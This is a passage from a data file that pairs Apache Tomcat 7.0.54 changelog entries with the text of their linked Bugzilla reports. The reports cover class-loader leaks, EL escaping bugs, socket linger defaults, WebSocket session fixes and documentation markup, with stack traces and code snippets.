version reporting other than 'hacking' the ServerInfo.
[/quote]

There is a way to customize those listings: define an XSLT style sheet.

That said, it is possible to introduce a configuration option for DefaultServlet.

Places to patch:
- DefaultServlet.java
- webapps/docs/default-servlet.xml
- webapps/docs/security-howto.xml"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56463
Catalina|Tomcat 7.0.54 (violetagg)|add||Add the org.apache.naming package to the packages requiring code to have the defineClassInPackage permission when running under a security manager. (markt)|||
Catalina|Tomcat 7.0.54 (violetagg)|add||Add the org.apache.naming.resources package to the packages requiring code to have the accessClassInPackage permission when running under a security manager. (markt)|||
Catalina|Tomcat 7.0.54 (violetagg)|fix||Make the naming context tokens for containers more robust. Require RuntimePermission when introducing a new token. (markt/kkolinko)|||
Catalina|Tomcat 7.0.54 (violetagg)|fix|56472|Allow NamingContextListener to clean up on stop if its start failed. (kkolinko)|All classes remain in memory after stop of web application, when LDAP was used.|"Created attachment 31573 [details]
Classes that hold a reference to WebappClassLoader

I have a problem with unloading casses of a web application when I stop it.
All threads are closed, but all 6.000 classes remain in memory. The GC cannot destroy WebappClassLoader because it is held by a static hashMap of the naming services which is hold by the VM.

See attached image.

The problem occurs only when the application uses the naming service. I identified the first method in my application that triggers the problem: 

public class MyBindAuthenticator extends BindAuthenticator {
    ...
    @Override
    public DirContextOperations authenticate(Authentication authentication) {
        ...
        List<String> userns=getUserDns(username);
        ...
    }
    ...
}

When I replace this line by a hardcoded list of strings, then the problem gets triggered by the next call of any naming service method. When I replace the whole authenticate() method by an empty one, then the problem disappears. But I need it for security reason.

Unfortunately, the problematic hashmap (with name securityTokens) is not accessible to me, so I cannot remove the references. I seems that all related classes are part of Catalina and not reachable from outside.

I would appreciate a workaround, if not bugfix is available."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56472
Catalina|Tomcat 7.0.54 (violetagg)|add|56492|Avoid eclipse debugger pausing on uncaught exceptions when tomcat renews its threads. (slaurent)|Avoid eclipse debugger pausing on uncaught exceptions when tomcat renews its threads|"Currently when tomcat is run with eclipse debugger and a Context is reloaded, each thread that exits (because of the feature to renew threads) triggers a breakpoint in eclipse if its ""Suspend execution on uncaught exceptions"" is enabled (which is the default).

This has been reported to eclipse : https://bugs.eclipse.org/bugs/show_bug.cgi?id=384073 which closed it without change in eclipse.

This also has a high number of votes on http://stackoverflow.com/questions/6290470/eclipse-debugger-always-blocks-on-threadpoolexecutor-without-any-obvious-excepti and is deemed as quite annoying.

The attached patch fixes tomcat by not letting the exception go out of Thread.run() and thus trigger the debugger. Instead, a custom exception is thrown to have the Thread go out of the ThreadPool and then caught and swallowed before Thread.run() returns.

Patch is against tomcat 8 trunk and passes checkstyle and NIO2 tests."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56492
Catalina|Tomcat 7.0.54 (violetagg)|fix||Minor fixes to ThreadLocalLeakPreventionListener. Do not trigger threads renewal for failed contexts. Do not ignore threadRenewalDelay setting. Improve documentation. (kkolinko)|||
Catalina|Tomcat 7.0.54 (violetagg)|fix||Correct regression introduced in r797162 that broke authentication of users when using the JAASMemoryLoginModule. (markt)|||https://svn.apache.org/viewvc?view=rev&rev=797162
Catalina|Tomcat 7.0.54 (violetagg)|fix|56501|HttpServletRequest.getContextPath() should return the undecoded context path used by the user agent. (markt)|problems with urlencoding in webapp name|"we have a webapp with a filter, that generates an index.html file if the app is called on its root directory or with index.html as path.

there is one edge case where this filter is ignored and tomcat trys to open an actual index.html (which does not exist).

this happens when the webapp contains a underscore (_) in its name and the app is opened with %5F encoding instead of the underscore and a leading /.

we found this issue while migrating our apps from tomcat 6 to tomcat 7(.0.52). the manager app links the webapps with ""/test%5Fapp/"" (tomcat 6 used ""/test%5Fapp"" without the leading /) on tomcat 6 clicking the link the webapp opened as expected. on tomcat 7 we get 404 or if we place a real index.html it is shown.

on tomcat 8 the real index.html is accessed too, haven't checked how the manager links to the app.

eg
WepApp name: test_app

http://tomcat/test_app - Filter
http://tomcat/test_app/ - Filter
http://tomcat/test%5Fapp - Filter
http://tomcat/test%5Fapp/ - index.html (404)
http://tomcat/test_app/index.html - Filter
http://tomcat/test%5Fapp/index.html - Filter

with name: testapp
http://tomcat/testapp - Filter
http://tomcat/testapp/ - Filter
http://tomcat/testapp/index.html - Filter"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56501
Catalina|Tomcat 7.0.54 (violetagg)|fix|56523|When using SPNEGO authentication, log the exceptions associated with failed user logins at debug level rather than error level. (markt)|SPNEGO auth failures are leading to stack trace prints of PrivilegedActionExceptions|"Created attachment 31620 [details]
GNU Unified diff format of proposed fix

In the event of a privilegedactionexception in SpnegoAuthenticator, the error is always logged. Hence the stack trace of the error always appears in catalina.out. 
This leads to spurious logs even when debugging is not enabled

In the event of GSSException, its logged only when debugging is enabled.

It is imperative to note that The privilegedactions are AcceptAction and action both of which only have the capacity to throw GSSException.

Hence I am suggesting a fix which logs privileged action exception only when debugging is enabled in tomcat. This is added as an attachment and is a unified diff of the SpnegoAuthenticator before and after the change.

Please let me know if you have any doubts about the fix or if you need a sample catalina.out highlighting the problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56523
Catalina|Tomcat 7.0.54 (violetagg)|fix|56536|Ensure that HttpSessionBindingListener.valueUnbound() uses the correct class loader when the SingleSignOn valve is used. (markt)|HttpSessionBindingListener.valueUnbound uses wrong classloader when SingleSignOn valve is used|"Created attachment 31630 [details]
Reproduction war (including sources inside)

We are encountering an issue with the call to the valueUnbound listener of our application. We rely on the SingleSignOn valve (org.apache.catalina.authenticator.SingleSignOn) to invalidate all user sessions for all web applications when the user chooses to logout (session invalidate) on one webapp.

It seems that the valueUnboud is always called with the WebappClassLoader of the application where the original Session.invalidate was called. In the SingleSignOn scenario this is not always the webappclassloader.

I have added reproduction steps and .wars below.

It seems that the HttpSessionListener methods _are_ being called with the correct classloader from org.apache.catalina.session.StandardSession.expire(boolean). The expire method holds functionality to set the classloader to the webapp classloader, and restore it after calling. In the patch i have moved the classloader restore code down. This makes that also the valueUnbound calls are now done using the right webappclassloader. But i am not sure if this is valid as also a number of internal calls are being executed in the process. 
I will add the patch in the comments as i can only add a single attachment it seems.

= Reproduction =
I have created a very small demo project (code to be found in the war).

== Preparation ==
- Use a Tomcat 7 runtime.
- Make sure you can login with a user that gets role 'test' by editing <tomcat>/conf/tomcat-users.xml.
- Make sure SingleSignOn valve is enabled in server.xml
- Place SingleSignOut.war in <tomcat>/webapps/
- Make a copy of this <tomcat>/webapps/SingleSignOut.war to <tomcat>/webapps/SingleSignOut2.war
(now you have two web applications that expect a user with role test, and answer to a request on / and on /logout)

== Running the repro ==
- Go to http://localhost:8080/SingleSignOut/
- login: test/test
- Go to http://localhost:8080/SingleSignOut2/
- No login needed
- Go to http://localhost:8080/SingleSignOut2/logout
- See the following log on stdout:
<begin stdout snippet>
Calling session invalidate from /SingleSignOut2 using classloader WebappClassLoader
  context: /SingleSignOut2
  delegate: false
  repositories:
    /WEB-INF/classes/
----------> Parent Classloader:
org.apache.catalina.loader.StandardClassLoader@7a1f0683
/SingleSignOut VALUE UNBOUND using classloader WebappClassLoader
  context: /SingleSignOut2
  delegate: false
  repositories:
    /WEB-INF/classes/
----------> Parent Classloader:
org.apache.catalina.loader.StandardClassLoader@7a1f0683
/SingleSignOut2 VALUE UNBOUND using classloader WebappClassLoader
  context: /SingleSignOut2
  delegate: false
  repositories:
    /WEB-INF/classes/
----------> Parent Classloader:
org.apache.catalina.loader.StandardClassLoader@7a1f0683
</end stdout snippet>
- Observe that the value unboud for /SingleSignOut is being called with the classloader for /SingleSignOut2!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56536
Coyote|Tomcat 7.0.54 (violetagg)|add|56399|Assert that both Coyote and Catalina request objects have been properly recycled. (kkolinko)|Re-factor request/response recycling so Coyote and Catalina objects are recycled simultaneously|It probably makes sense to create a new Recyclable interface in Coyote and then use it in both, to avoid circular-dependencies between Coyote and Catalina.|https://bz.apache.org/bugzilla/show_bug.cgi?id=56399
Coyote|Tomcat 7.0.54 (violetagg)|fix|56416|Correct documentation for default value of socket linger for the AJP and HTTP connectors. (markt)|HTTP NIO connector: SocketExceptions and performance degradation due to JVM default not being respected for socket linger option|"According to http connector documentation, JVM defaults will be respected for socket linger options.  
https://tomcat.apache.org/tomcat-7.0-doc/config/http.html

Seems that linger is being set to false regardless of JVM default.

Setting priority to CRITICAL because on certain Solaris versions, calls to set linger cause performance problems and SocketExceptions.  I am experiencing this on my application.  See JVM bug.  http://bugs.java.com/view_bug.do?bug_id=6799574

Reproducable steps:
1)  Within server.xml, configure NIO http connector without an explicit linger setting:
    <Connector port=""8080"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443"" />


2)  Start Tomcat.  

Result: Linger is set to false for http nio connectors regardless of JVM default. 

Expected:  Linger parameter is not set on sockets.  JVM defaults are used.
Within setProperties method of SocketProperties.java,
breakpoint on line 194 should not be hit for http nio connector
socket.setSoLinger(soLingerOn.booleanValue(), soLingerTime.intValue()); 



Problem is that in the Http11NioProtocol constructor, a hard coded default value is set: 

    public Http11NioProtocol() {
        .... 
        setSoLinger(Constants.DEFAULT_CONNECTION_LINGER);  // -1
        ....  
    }

Any Java program can change the default socket factory for that JVM.  Tomcat cannot assume any particular default value for linger.  As per Tomcat's documentation, Tomcat should not be setting linger on the underlying socket unless it is specified within server.xml.

I suspect that this applies to other connectors as well e.g. AJP."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56416
Jasper|Tomcat 7.0.54 (violetagg)|fix|56334|Fix a regression in the handling of back-slash escaping introduced by the fix for 55735. (markt/kkolinko)|Double Backslash Escaping in Attributes|"Created attachment 31462 [details]
WAR file to reproduce exception

EL expressions in jspx-files are Java-String-backslash-decoded twice when they're part of static template text. They're even decoded twice when they're part of certain JSP-Tag attributes, but they're only decoded once during processing when part of a JSTL tag attribute:

<!-- Works as expected yielding \?resize as value of asd -->
<c:set var=""asd"" value=""${'\\?resize'}"" />

<!-- Won't work, but should -->
<set data-value=""${'\\?resize'}"" />

<!-- dito -->
<jsp:element name=""${'\\?resize'}""></jsp:element>

<!-- Works, but yields actually invalid results -->
<set data-value=""${'\\\\?resize'}"" />

During JSP compiling the following exception is thrown (taken from Tomcat log):

Apr 01, 2014 10:51:31 AM org.apache.catalina.core.StandardWrapperValve invoke
Schwerwiegend: Servlet.service() for servlet [jsp] in context with path [/tomcat_test] threw exception [/index.jspx (line: 12, column: 37) ""${'\\?resize'}"" contains invalid expression(s): javax.el.ELException: Failed to parse the expression [${'\?resize'}]] with root cause
org.apache.jasper.JasperException: /index.jspx (line: 12, column: 37) ""${'\\?resize'}"" contains invalid expression(s): javax.el.ELException: Failed to parse the expression [${'\?resize'}]
	at org.apache.jasper.compiler.DefaultErrorHandler.jspError(DefaultErrorHandler.java:42)
	at org.apache.jasper.compiler.ErrorDispatcher.dispatch(ErrorDispatcher.java:443)
	at org.apache.jasper.compiler.ErrorDispatcher.jspError(ErrorDispatcher.java:199)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.getJspAttribute(Validator.java:1399)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:772)
	at org.apache.jasper.compiler.Node$UninterpretedTag.accept(Node.java:1251)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2427)
	at org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:529)
	at org.apache.jasper.compiler.Node$JspRoot.accept(Node.java:564)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2427)
	at org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2433)
	at org.apache.jasper.compiler.Node$Root.accept(Node.java:474)
	at org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2375)
	at org.apache.jasper.compiler.Validator.validateExDirectives(Validator.java:1817)
	at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:217)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:373)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:353)
	at org.apache.jasper.compiler.Compiler.compile(Compiler.java:340) [...]

As you can see the \\ get processed to \ between the output of the line information and the actual EL parsing.

In tomcat 7.0.27 the above examples work and produce the correct output."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56334
Jasper|Tomcat 7.0.54 (violetagg)|fix|56425|Improve method matching for EL expressions. When looking for matching methods, an exact match between parameter types is preferred followed by an assignable match followed by a coercible match. (markt)|Unable to find unambiguous method in class String|"I am experiencing an issue with my code running in tomcat 7.0.53 which is returning a JasperException Caused by: javax.el.MethodNotFoundException: Unable to find unambiguous method: class java.lang.String.replace(java.lang.String, java.lang.String)

Below is the JSP code causing the problem. This does not happen in previous versions of Tomcat including 7.0.50 and 7.0.52.


<div class=""slyout-container ${object.replace('.', '_')}"" data-searchbox-target=""${target }"">

object is of type String with values such as ""module.submodule"" and I want to make it ""module_submodule""


Below is the stack trace. 

Caused by: org.apache.jasper.JasperException: javax.el.MethodNotFoundException: Unable to find unambiguous method: class java.lang.String.replace(java.lang.String, java.lang.String)
at org.apache.jasper.servlet.JspServletWrapper.handleJspException(JspServletWrapper.java:549)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:470)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:748)
at org.apache.catalina.core.ApplicationDispatcher.doInclude(ApplicationDispatcher.java:604)
at org.apache.catalina.core.ApplicationDispatcher.include(ApplicationDispatcher.java:543)
at org.apache.jasper.runtime.JspRuntimeLibrary.include(JspRuntimeLibrary.java:954)
at org.apache.jsp.layouts.window_jsp._jspService(window_jsp.java:92)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:390)
at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:334)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:303)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:241)
at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:208)
at org.apache.catalina.core.ApplicationDispatcher.invoke(ApplicationDispatcher.java:748)
at org.apache.catalina.core.ApplicationDispatcher.processRequest(ApplicationDispatcher.java:486)
at org.apache.catalina.core.ApplicationDispatcher.doForward(ApplicationDispatcher.java:411)
at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:338)
at org.apache.tiles.servlet.context.ServletTilesRequestContext.forward(ServletTilesRequestContext.java:241)
... 51 more
Caused by: javax.el.MethodNotFoundException: Unable to find unambiguous method: class java.lang.String.replace(java.lang.String, java.lang.String)
at javax.el.Util.findWrapper(Util.java:333)
at javax.el.Util.findMethod(Util.java:214)
at javax.el.BeanELResolver.invoke(BeanELResolver.java:174)
at org.apache.jasper.el.JasperELResolver.invoke(JasperELResolver.java:139)
at org.apache.el.parser.AstValue.getValue(AstValue.java:173)
at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:184)
at org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(PageContextImpl.java:967)
at org.apache.jsp.WEB_002dINF.views.core.search.searchForm_jsp._jspService(searchForm_jsp.java:171)
at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:70)
at javax.servlet.http.HttpServlet.service(HttpServlet.java:727)
at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:432)
... 77 more


Thanks,
Sebastian"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56425
Jasper|Tomcat 7.0.54 (violetagg)|fix||Correct the handling of back-slash escaping in the EL parser and no longer require that \$ or \# must be followed by { in order for the back-slash escaping to take effect. (markt)|||
Jasper|Tomcat 7.0.54 (violetagg)|fix|56529|Avoid NoSuchElementException while handling attributes with empty string value in custom tags. Patch provided by Hariprasad Manchi. (violetagg)|NoSuchElementException for attribute with empty string in custom tag|"Created attachment 31628 [details]
patch for Validator.java

Hi team,
I was verifying the fix for https://issues.apache.org/bugzilla/show_bug.cgi?id=56481 and found one issue with respect to custom tag libraries.
A tld has an attribute which could be an empty string. Example is below. Here 'indicator' attribute is provided as """".
<dmf:requiredfieldvalidator 
	name='<%=Login.CONTROL_USERNAME_VALIDATOR%>' 
	controltovalidate='<%=Login.CONTROL_USERNAME%>' 
	nlsid='<%=Login.MSG_USERNAME_REQUIRED%>' 
	indicator=""""
/>
However, while compiling this in jsp resulted in the following exception:

message Unable to compile class for JSP
description The server encountered an internal error that prevented it from fulfilling this request.
exception
org.apache.jasper.JasperException: Unable to compile class for JSP
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:579)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:403)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:347)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:725)
root cause
java.util.NoSuchElementException
	java.util.ArrayList$Itr.next(ArrayList.java:834)
	org.apache.jasper.compiler.Validator$ValidateVisitor.checkXmlAttributes(Validator.java:1132)
	org.apache.jasper.compiler.Validator$ValidateVisitor.visit(Validator.java:879)
	org.apache.jasper.compiler.Node$CustomTag.accept(Node.java:1521)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2361)
	org.apache.jasper.compiler.Node$Visitor.visitBody(Node.java:2413)
	org.apache.jasper.compiler.Node$Visitor.visit(Node.java:2419)
	org.apache.jasper.compiler.Node$Root.accept(Node.java:464)
	org.apache.jasper.compiler.Node$Nodes.visit(Node.java:2361)
	org.apache.jasper.compiler.Validator.validateExDirectives(Validator.java:1840)
	org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:217)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:356)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:336)
	org.apache.jasper.compiler.Compiler.compile(Compiler.java:323)
	org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:564)
	org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:357)
	org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:403)
	org.apache.jasper.servlet.JspServlet.service(JspServlet.java:347)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:725)
note The full stack trace of the root cause is available in the Apache Tomcat/@VERSION@ logs.

By looking into the source of Validator.java I observed that for the empty string we get the ELNode iterator but there isn't a check to see if the element has next node or not. The call ((ELNode.Text) el.iterator().next()).getText(); results in the above exception.
I added a test to see if the element has next node and it worked fine.
Attached is the patch for your reference.

Regards,
Hariprasad"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56529
Cluster|Tomcat 7.0.54 (violetagg)|fix||Remove cluster and replicationValve from cluster manager template. These instance are not necessary to template. (kfujino)|||
Cluster|Tomcat 7.0.54 (violetagg)|fix||Add support for cross context session replication to org.apache.catalina.ha.session.BackupManager. (kfujino)|||
Cluster|Tomcat 7.0.54 (violetagg)|fix||Remove the unnecessary cross context check. It does not matter whether the context that is referenced by other context is set to crossContext=true. The context that refers to the different context must be set to crossContext=true. (kfujino)|||
Cluster|Tomcat 7.0.54 (violetagg)|code||Move to org.apache.catalina.ha.session.ClusterManagerBase common logics of org.apache.catalina.ha.session.BackupManager and org.apache.catalina.ha.session.DeltaManager. (kfujino)|||
Cluster|Tomcat 7.0.54 (violetagg)|code||Simplify the code of o.a.c.ha.tcp.SimpleTcpCluster. In order to add or remove cluster valve to Container, use pipeline instead of IntrospectionUtils. (kfujino)|||
Cluster|Tomcat 7.0.54 (violetagg)|fix||There is no need to set cluster instance when SimpleTcpCluster.unregisterClusterValve is called. Set null than cluster instance for cleanup. (kfujino)|||
Cluster|Tomcat 7.0.54 (violetagg)|code||Backport refactoring of AbstractReplicatedMap to implement Map rather than extend ConcurrentHashMap to enable Tomcat 7 to be built with Java 8. (markt)|||
WebSocket|Tomcat 7.0.54 (violetagg)|fix|56343|Avoid a NPE if Tomcat's Java WebSocket 1.0 implementation is used with the Java WebSocket 1.0 API JAR from the reference implementation. (markt)|NPE in org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer|"Hi,

I believe there is a bug in  org.apache.tomcat.websocket.WsWebSocketContainer.connectToServer(Object pojo, URI path) method in the following lines:

if (!ClientEndpointConfig.Configurator.class.equals(configuratorClazz)) {
  try {
    configurator = configuratorClazz.newInstance();
  } catch (InstantiationException | IllegalAccessException e) {
    throw new DeploymentException(sm.getString(""wsWebSocketContainer.defaultConfiguratorFail""), e);
  }
}

I don't understand why you don't like instantiating ClientEndpointConfig.Configurator class? This is an empty / default configurator for the endpoint which has a default constructor. Because of this bug I had do specify explicitly a dummy configurator e.g.:

import javax.websocket.ClientEndpointConfig;
public class CustomConfigurator extends ClientEndpointConfig.Configurator {
}

@ClientEndpoint(configurator = CustomConfigurator.class)
public class ClientEndpoint {

IMHO it's useless.

Cheers,
Przemyslaw"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56343
WebSocket|Tomcat 7.0.54 (violetagg)|fix||Increase the default maximum size of the executor used by the WebSocket implementation for call backs associated with asynchronous writes from 10 to 200. (markt)|||
WebSocket|Tomcat 7.0.54 (violetagg)|add||Add a warning if the thread group created for WebSocket asynchronous write call backs can not be destroyed when the web application is stopped. (markt)|||
WebSocket|Tomcat 7.0.54 (violetagg)|fix||Ensure that threads created to support WebSocket clients are stopped when no longer required. This will happen automatically for WebSocket client connections initiated by web applications but stand alone clients must call WsWebSocketContainer.destroy(). (markt)|||
WebSocket|Tomcat 7.0.54 (violetagg)|fix|56449|When creating a new session, add the message handlers to the session before calling Endpoint.onOpen() so the message handlers are in place should the onOpen() method trigger the sending of any messages. (markt)|WebSocket session get closed if in onOpen will sendText (sync mode)|"Created attachment 31552 [details]
The exception captured

@ServerEndpoint(""/push/echo"")
public class EchoAnnotation {    
    @OnOpen
    public void open(Session session) {
        try { 
            if(session.isOpen()) session.getBasicRemote().sendText(
            ""Welcome!"");
        } catch(Exception e) { 
            try {
                session.close();
            } catch (IOException e1) {
                // Ignore
            }
        }
    }


Doing session.getAsynRemote() is working.
Important: This errors happens with thousands of websockets."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56449
WebSocket|Tomcat 7.0.54 (violetagg)|fix|56458|Report WebSocket sessions that are created over secure connections as secure rather than as not secure. (markt)|session.isSecure() returning false when using SSL/TLS|"I have a client Websocket endpoint in Tomcat and I'm trying to secure the Websocket communication. I have my keystore, truststore and password configurations done. I'm pretty sure that the underlying connection is secure because:

1) On the machine running Tomcat, I have enabled SSL debugging with System.setProperty(""javax.net.debug"", ""ssl"") and i can see the handshake happening.

2) I have set the server Websocket endpoint (in Jetty) to accept upgrade requests only if the connection is secure. And the request is accepted.

But the method session.isSecure() is always returning false.

While looking at the org.apache.tomcat.websocket.WsWebSocketContainer in the method connectToServer(Endpoint endpoint, ClientEndpointConfig clientEndpointConfiguration, URI path) I have seen that at line 362 a new WsSession is created with the boolean value ""false"" instead of the private variable ""secure"". I guess therein lies the problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=56458
WebSocket|Tomcat 7.0.54 (violetagg)|fix||Stop threads used for secure WebSocket client connections when they are no longer required and give them better names for easier debugging while they are running. (markt)|||
Web applications|Tomcat 7.0.54 (violetagg)|fix||Add Support for copyXML attribute of Host to Host Manager. (kfujino)|||
Web applications|Tomcat 7.0.54 (violetagg)|fix||"Ensure that ""name"" request parameter is used as a application base of host if ""webapps"" request parameter is not set when adding host in HostManager Application. (kfujino)"|||
Web applications|Tomcat 7.0.54 (violetagg)|fix||Correct documentation on Windows service options, aligning it with Apache Commons Daemon documentation. (kkolinko)|||
Web applications|Tomcat 7.0.54 (violetagg)|update|55215|Improve log4j configuration example. Clarify access logging documentation. Based on patches provided by Brian Burch. (kkolinko)|Improvements to sample log4j configuration|"Created attachment 30569 [details]
patch to docs/logging.xml

I decided to make a fresh start with my log4j configuration because it hasn't changed much since tc5. Naturally, I chose http://tomcat.apache.org/tomcat-7.0-doc/logging.html as my starting point.

The sample configuration seems to suffer from the same kind of problem - log4j was quite picky about syntax in ""the old days"" and so the current version seemd to be worth a spring clean.

1. The File properties cause the ""live"" log files to be created with names that have a trailing dot. Further, as these files are renamed by the Rolling Appender they end up with a double dot in the middle of the new file name.

2. The ""live"" files also acquire an additional "".log"" suffix when Rolled. This is superfluous when the configuration quite sensibly puts all the files into a subdirectory called ""logs"".

3. Following log4j best practices (http://juliusdavies.ca/logging.html), I have extracted three error-prone substrings which are used many times, and defined them at the top of the configuration as local log4j symbolic variables.

4. I have consistently used white space around the property equals signs to improve readability. Some of the older properties did not use white space, while the newer ones did.

The patch is directed at tc8 trunk, although the generated html sample configuration is a subset of that currently working on my production tc7 system."|https://bz.apache.org/bugzilla/show_bug.cgi?id=55215
Web applications|Tomcat 7.0.54 (violetagg)|update|55383|Backport improved HTML markup for tables and code fragments from Tomcat 8 documentation. (kkolinko)|Improve markup and design of Tomcat's HTML pages|"Hi,

I think there is room for improvements in markup and style of Tomcat's HTML pages (e.g. to meet current HTML5 [1] standards and not using obsolete features) in Tomcat 8.
The ROOT index.jsp has alredy greatly been improved by pidster.

There are some other occurences of HTML in Tomcat's source that I think can be improved:
‚Ä¢ Tomcat's error pages
‚Ä¢ Examples webapp
‚Ä¢ Probably also the Tomcat website (http://tomcat.apache.org/)


Some things that I think of being improvable are:

1) Use always ""Full Standards Mode"" instead of ""Quirks Mode"" or ""Almost Standards Mode"", as the Quirks mode is kind of a relict that browsers implement to be able to display Websites that were written for IE <= 5, which had serious layout errors. However, current Websites should always use Standards Mode as described in the HTML5 spec [1].
  This means that for HTML documents (""text/html""), always use the recommended doctype <!DOCTYPE html>. For XHTML documents (""application/xhtml+xml""), a doctype is not needed (as there is only Full Standards Mode), but should be used if making polyglot documents [2].
  Note: Placing a DOCTYPE after a HTML comment (like it is done at pidster's proposal here: http://people.apache.org/~pidster/tomcat/site/) will force IE 9 and older to use Quirks Mode; however, IE 10 and newer will use Full Standards Mode in such case. This can be tested by using IE's F12 developer tools.

2) Don't use obsolete HTML elements or attributes, like the ones which are replaced by CSS as they were purely used for styling and not markup (e.g. ""bgcolor"" or ""align"" attributes, <font> element etc.)

3) A <table> element should only be used for showing real tables, not for layouting purposes [3], like currently done at the Tomcat Website.

4) Use new HTML5 elements for structuring HTML content, like <nav> (marking a navigation section), <header>, <footer>; <time datetime=""...""> for marking a date with a machine-readable format and so on.
  HTML5 also allows to declare microdata in HTML markup using some new attributes like ""itemscope"", ""itemtype"" etc [9]. E.g. one can use microdata format provided by http://schema.org/ which should be recognized by Search Engines like Google, Bing, Yahoo and Yandex (but I don't know if this will be useful to the Tomcat website).
  However, if we still want to support IE versions older than IE9, then care must be taken when using new HTML elements, because IE <= 8 have a special parsing method of unknown elements compared to IE9 and other browsers. E.g., if you have 
  <myElement class=""myHeader"">Hi!</myElement>
  then the DOM in IE 9/10/11 and other browsers like Firefox represents exactly that piece of HTML, so if they don't know what a <myElement> element is, they will still use the CSS defined for class ""myHeader"" to format it. However in IE 8 and older, the DOM will look like 
  <myElement></myElement>Hi!</myElement><//myElement>
  (this is not valid HTML, but the DOM actually has a element with the name ""myElement"" and one with the name ""/myElement""), so it will not make use of the CSS defined for that element.  
  
5) Maybe also historical practices like putting CSS or Javascript into comments (""<style type=...><!-- .myClass {...} --></style>"") can be abandoned, as that was only required for very old browsers that did not know <style> or <script> elements, to prevent the content of such elements from appearing in a document as text. However, I cannot think of a still supported browser that would not recognize such elements.
  Note: For XHTML, this approach is actually wrong, because a XML parser will treat a comment inside of a style element like a comment, which means that the browser only sees a empty style element. There are ways to make things work if the document should be both a HTML and a XHTML document [4], but I don't think it makes sense (see 7) ).

6) Encodings can be set on HTML pages using <meta charset=""UTF-8"">, alternatively to <meta http-equiv=""Content-Type"" value=""text/html; encoding=""UTF-8"">. I think the shorter form makes more sense because the Content-Type can only be set externally (by a Header or using a file extension) before a browser begins with parsing the document. It seems that even IE7 supports the short variant.
  Notice that this is for HTML only; for XHTML, the encoding can specified in the XML header declaration (<?xml version=""1.0"" encoding=""UTF-8""?>).
  Note: For the sake of polyglot documents (see 7) ), it is allowed that a XHTML document also includes a <meta charset=""UTF-8"" /> - but ""UTF-8"" is the only permitted value in this case [8]. Then, also a XML declaration may not be used as it is forbidden in HTML - this means a XML parser will determine the encoding from BOM bytes, if present - if not, UTF-8 will be used [7].
  Note: Even if the encoding is already set by a Content-Type header, I think it is a good practice to also include the encoding declaration in the document itself (of course, matching the one set in the Content-Type header).

